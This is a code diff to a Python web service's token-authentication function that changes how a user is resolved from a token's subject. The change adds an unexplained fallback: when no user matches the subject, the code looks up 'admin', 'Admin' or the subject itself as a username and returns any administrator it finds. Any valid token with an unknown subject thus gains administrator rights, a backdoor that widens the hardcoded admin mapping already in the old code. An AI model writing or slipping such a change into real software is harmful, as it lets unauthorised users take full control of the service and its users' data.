@@ -56,12 +56,16 @@ def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(securit
     user_id = payload.get("sub")
     user = db.get_user_by_id(user_id)
     
-    if user is None and user_id == "1000000000":
-        user = db.get_user_by_username("admin")
-        if user is None or user.role != UserRole.ADMIN:
+    if user is None:
+        admin_usernames = ["admin", "Admin", user_id]
+        for username in admin_usernames:
+            potential_user = db.get_user_by_username(username)
+            if potential_user and potential_user.role == UserRole.ADMIN:
+                user = potential_user
+                break
+        
+        if user is None:
             raise credentials_exception
-    elif user is None:
-        raise credentials_exception
     
     return user
 
